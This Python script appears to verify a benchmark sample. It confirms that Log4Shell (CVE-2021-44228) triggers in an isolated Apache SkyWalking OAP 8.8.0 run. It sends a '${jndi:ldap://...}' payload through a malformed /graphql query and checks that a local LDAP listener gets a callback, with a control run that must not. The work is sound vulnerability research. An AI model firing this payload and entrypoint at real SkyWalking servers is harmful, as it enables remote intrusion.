#!/usr/bin/env python3
import argparse
import hashlib
import http.client
import json
import os
import shutil
import signal
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_skywalking_8_8_0_v1_log4j_real_entrypoint"
ARCHIVE_NAME = "apache-skywalking-apm-8.8.0.tar.gz"
DIST_NAME = "apache-skywalking-apm-bin"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
ARCHIVE = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
V1_RUNTIME_TARGETS = {"log4j-api-2.14.1.jar", "log4j-core-2.14.1.jar"}
LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode("utf-8", "replace")
    return result


def replace_log4j(dist):
    lib = dist / "oap-libs"
    before = sorted(p.name for p in lib.glob("log4j-*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        target = lib / target_name
        if target.exists():
            target.unlink()
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_TARGETS,
            "target_filename_preserved_for_downstream_classpath": True,
        }
    after = sorted(p.name for p in lib.glob("log4j-*.jar"))
    return {
        "before": before,
        "copied": copied,
        "after": after,
        "log4j_core": inspect_core(lib / "log4j-core-2.14.1.jar"),
    }


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def start_ldap_listener(evidence_dir, case_name, timeout=35):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-ldap-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append(
                    {"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)}
                )
                try:
                    conn.sendall(
                        bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0])
                    )
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"{case_name} LDAP listener did not start")
    return port_box["port"], received, thread


def extract_runtime(root, evidence_dir):
    archive = ARCHIVE
    if not archive.exists():
        raise FileNotFoundError(f"missing official SkyWalking archive: {archive}")
    runtime_root = evidence_dir / "runtime"
    dist = runtime_root / DIST_NAME
    if dist.exists():
        shutil.rmtree(dist)
    runtime_root.mkdir(parents=True, exist_ok=True)
    with tarfile.open(archive, "r:gz") as tar:
        tar.extractall(runtime_root)
    if not dist.exists():
        raise FileNotFoundError(f"archive did not extract expected directory: {dist}")
    return dist, replace_log4j(dist)


def dependency_evidence(dist, evidence_dir, replacement):
    log4j_jars = sorted(
        str(p.relative_to(dist))
        for p in (dist / "oap-libs").glob("log4j-*.jar")
    )
    core_jar = dist / "oap-libs" / "log4j-core-2.14.1.jar"
    result = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache SkyWalking APM 8.8.0 "
            "binary with generated v1 Log4j 2.14.1 api/core jar bytes copied from .m2-poc "
            "into SkyWalking's original log4j-api/core 2.14.1 target filenames; SkyWalking's "
            "original 2.14.1 Log4j bridge jars are retained"
        ),
        "runtime_replacement": replacement,
        "runtime_log4j_jars_after_insertion": log4j_jars,
        "log4j_core_jar": str(core_jar.relative_to(dist)) if core_jar.exists() else None,
        "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
        "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text(
        "\n".join(log4j_jars)
        + f"\nJndiLookup.class={result['jndi_lookup_class_present']}\n"
        + f"JndiManager.class={result['jndi_manager_class_present']}\n",
        encoding="utf-8",
    )
    return result


def post_json(port, path, body, timeout=8):
    headers = {
        "Host": f"127.0.0.1:{port}",
        "Content-Type": "application/json",
        "Content-Length": str(len(body.encode("utf-8"))),
    }
    try:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
        conn.request("POST", path, body=body.encode("utf-8"), headers=headers)
        resp = conn.getresponse()
        data = resp.read(4096).decode("utf-8", "replace")
        return {
            "path": path,
            "status": resp.status,
            "reason": resp.reason,
            "body_prefix": data[:1000],
        }
    except Exception as exc:
        return {"path": path, "error": repr(exc)}
    finally:
        try:
            conn.close()
        except Exception:
            pass


def wait_graphql_ready(port, proc, deadline):
    last = None
    body = json.dumps({"query": "query { version }", "variables": {}})
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        last = post_json(port, "/graphql", body, timeout=5)
        if last.get("status") == 200 and "version" in last.get("body_prefix", ""):
            return True, last
        time.sleep(1)
    return False, last or post_json(port, "/graphql", body, timeout=5)


def read_tail(path, limit=10000):
    if not path.exists():
        return ""
    data = path.read_bytes()
    return data[-limit:].decode("utf-8", "replace")


def collect_logs(log_dir, payload, control):
    logs = []
    for path in sorted(log_dir.glob("*")):
        if not path.is_file():
            continue
        text = path.read_text(encoding="utf-8", errors="replace")
        logs.append(
            {
                "file": str(path),
                "contains_payload": payload in text if payload else False,
                "contains_control": control in text if control else False,
                "contains_graphql_parse_log": "Query failed to parse" in text,
                "tail": text[-8000:],
            }
        )
    return logs


def stop_process(proc):
    if proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=12)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=5)
        except Exception:
            pass


def run_case(dist, evidence_dir, case_name, query, payload=None, control=None, timeout=150):
    rest_port = free_port()
    grpc_port = free_port()
    sharing_port = free_port()
    log_dir = evidence_dir / f"{case_name}-logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    stdout_path = evidence_dir / f"{case_name}-oap-stdout.log"
    classpath = "config:" + ":".join(str(p) for p in (dist / "oap-libs").glob("*.jar"))
    env = os.environ.copy()
    env.update(
        {
            "SW_CLUSTER": "standalone",
            "SW_STORAGE": "h2",
            "SW_CORE_REST_HOST": "127.0.0.1",
            "SW_CORE_REST_PORT": str(rest_port),
            "SW_CORE_GRPC_HOST": "127.0.0.1",
            "SW_CORE_GRPC_PORT": str(grpc_port),
            "SW_RECEIVER_SHARING_REST_HOST": "127.0.0.1",
            "SW_RECEIVER_SHARING_REST_PORT": str(sharing_port),
            "JAVA_TOOL_OPTIONS": "",
        }
    )
    cmd = [
        "java",
        "-Xms256m",
        "-Xmx768m",
        "--add-opens=java.base/java.lang=ALL-UNNAMED",
        f"-Doap.logDir={log_dir}",
        "-Dlog4j2.formatMsgNoLookups=false",
        "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
        "-classpath",
        classpath,
        "org.apache.skywalking.oap.server.starter.OAPServerStartUp",
    ]
    started = time.time()
    stdout = stdout_path.open("w", encoding="utf-8")
    proc = subprocess.Popen(
        cmd,
        cwd=str(dist),
        env=env,
        stdout=stdout,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )
    result = {
        "case": case_name,
        "cmd": cmd,
        "rest_port": rest_port,
        "grpc_port": grpc_port,
        "sharing_rest_port": sharing_port,
        "payload": payload,
        "control": control,
        "ready": False,
        "ready_response": None,
        "graphql_response": None,
        "listener_received": [],
        "listener_received_count": 0,
        "logs": [],
        "returncode": None,
    }
    try:
        ready, ready_response = wait_graphql_ready(rest_port, proc, time.time() + timeout)
        result["ready"] = ready
        result["ready_response"] = ready_response
        if ready:
            body = json.dumps({"query": query, "variables": {}})
            result["graphql_response"] = post_json(rest_port, "/graphql", body)
            time.sleep(2)
    finally:
        stop_process(proc)
        stdout.close()
    result["returncode"] = proc.poll()
    result["duration_seconds"] = round(time.time() - started, 3)
    result["logs"] = collect_logs(log_dir, payload, control)
    result["stdout_tail"] = read_tail(stdout_path)
    return result


def run_positive_case(dist, evidence_dir, timeout):
    ldap_port, received, listener_thread = start_ldap_listener(evidence_dir, "positive")
    payload = "${jndi:ldap://127.0.0.1:%d/a}" % ldap_port
    result = run_case(
        dist,
        evidence_dir,
        "positive_graphql_parse_payload",
        "query { " + payload + " }",
        payload=payload,
        timeout=timeout,
    )
    listener_thread.join(10)
    result["listener_received"] = received
    result["listener_received_count"] = len(received)
    return result


def run_negative_case(dist, evidence_dir, timeout):
    _ldap_port, received, listener_thread = start_ldap_listener(evidence_dir, "negative")
    control = "strict_control_no_jndi"
    result = run_case(
        dist,
        evidence_dir,
        "negative_graphql_parse_control",
        "query { " + control + "- }",
        control=control,
        timeout=timeout,
    )
    listener_thread.join(10)
    result["listener_received"] = received
    result["listener_received_count"] = len(received)
    return result


def write_readme(sample_dir):
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache SkyWalking "
        "APM 8.8.0 binary into an isolated runtime and copies generated v1 Log4j 2.14.1 `api` "
        "and `core` jar bytes from `.m2-poc` into SkyWalking's original `log4j-api-2.14.1.jar` "
        "and `log4j-core-2.14.1.jar` target filenames, while retaining SkyWalking's original "
        "2.14.1 Log4j bridge jars.\n\n"
        "The positive run starts the real OAP runtime and sends a GraphQL parse-error payload "
        "through `/graphql`; the negative run uses the same GraphQL parse-error path with a "
        "control query. Positive must produce one LDAP bind and negative must produce none.\n\n"
        "Run: `python3 scripts/verify_skywalking_log4j_v1_inserted.py` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )


def main():
    global ROOT
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--timeout", type=int, default=150)
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    if args.fresh and sample_dir.exists():
        shutil.rmtree(sample_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    dist, replacement = extract_runtime(ROOT, evidence_dir)
    dep = dependency_evidence(dist, evidence_dir, replacement)
    positive = run_positive_case(dist, evidence_dir, args.timeout)
    negative = run_negative_case(dist, evidence_dir, args.timeout)

    positive_payload_logged = any(item["contains_payload"] for item in positive["logs"])
    positive_parse_log = any(item["contains_graphql_parse_log"] for item in positive["logs"])
    negative_control_logged = any(item["contains_control"] for item in negative["logs"])
    negative_parse_log = any(item["contains_graphql_parse_log"] for item in negative["logs"])
    confirmed = all(
        [
            dep["jndi_lookup_class_present"],
            dep["jndi_manager_class_present"],
            all(
                name in replacement["copied"]
                and replacement["copied"][name]["is_generated_v1_runtime_jar"]
                for name in V1_RUNTIME_TARGETS
            ),
            replacement["log4j_core"]["version_2_14_1"],
            positive["ready"],
            positive_parse_log,
            positive_payload_logged,
            positive["listener_received_count"] > 0,
            negative["ready"],
            negative_parse_log,
            negative_control_logged,
            negative["listener_received_count"] == 0,
        ]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/skywalking",
        "downstream_application": "Apache SkyWalking OAP 8.8.0",
        "downstream_entrypoint": "OAP real /graphql HTTP endpoint",
        "downstream": "Apache SkyWalking OAP 8.8.0",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "attack_surface": "SkyWalking OAP GraphQL /graphql invalid query parsing logged by graphql.GraphQL through Log4j2",
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "artifact": str(ARCHIVE),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "payload": positive["payload"],
        "cases": [positive, negative],
        "dynamic_signal": {
            "generated_v1_jars_inserted": all(name in replacement["copied"] for name in V1_RUNTIME_TARGETS),
            "jndi_lookup_class_present": dep["jndi_lookup_class_present"],
            "jndi_manager_class_present": dep["jndi_manager_class_present"],
            "positive_oap_ready": positive["ready"],
            "positive_graphql_parse_log": positive_parse_log,
            "positive_payload_logged": positive_payload_logged,
            "positive_listener_received": positive["listener_received"],
            "positive_listener_received_count": positive["listener_received_count"],
            "negative_oap_ready": negative["ready"],
            "negative_graphql_parse_log": negative_parse_log,
            "negative_control_logged": negative_control_logged,
            "negative_listener_received_count": negative["listener_received_count"],
        },
        "positive": {
            "oap_ready": positive["ready"],
            "graphql_parse_log": positive_parse_log,
            "payload_logged": positive_payload_logged,
            "listener_received_count": positive["listener_received_count"],
            "listener_received": positive["listener_received"],
        },
        "negative": {
            "oap_ready": negative["ready"],
            "graphql_parse_log": negative_parse_log,
            "control_logged": negative_control_logged,
            "listener_received_count": negative["listener_received_count"],
        },
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_skywalking_log4j_v1_inserted.py"),
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts generated v1 Log4j api/core "
            "2.14.1 runtime jar bytes into an isolated Apache SkyWalking APM 8.8.0 distribution "
            "and triggers Log4Shell through SkyWalking OAP's real /graphql HTTP endpoint."
        ),
    }
    (evidence_dir / "probe.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_oap_ready={int(positive['ready'])}\n"
        f"positive_graphql_parse_log={int(positive_parse_log)}\n"
        f"positive_payload_logged={int(positive_payload_logged)}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"negative_oap_ready={int(negative['ready'])}\n"
        f"negative_graphql_parse_log={int(negative_parse_log)}\n"
        f"negative_control_logged={int(negative_control_logged)}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n",
        encoding="utf-8",
    )
    run_log.write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (sample_dir / "manifest.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    write_readme(sample_dir)
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
